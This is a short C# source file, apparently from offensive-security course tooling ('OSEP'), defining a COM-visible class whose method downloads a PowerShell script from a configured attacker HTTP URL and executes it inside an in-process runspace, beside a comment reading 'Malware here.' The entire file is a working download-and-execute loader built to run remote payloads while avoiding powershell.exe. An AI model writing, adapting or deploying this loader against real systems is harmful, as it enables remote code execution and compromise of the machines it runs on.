using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    [ComVisible(true)]
    public class OSEPRunner
    {

        public static void OSEPExec()
        {
            //Malware here.
            Debug.RunDebug("DLL Artifact PS Runspace Dynamic OSEPExec() has started...");

            byte[] script = DownloadFileAsync($"{CONFIG.HTTP_URL}/{CONFIG.PS_DYNAMIC_SCRIPT_NAME}").GetAwaiter().GetResult();

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(Encoding.UTF8.GetString(script));

            ps.Invoke();

            rs.Close();
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }

    }
}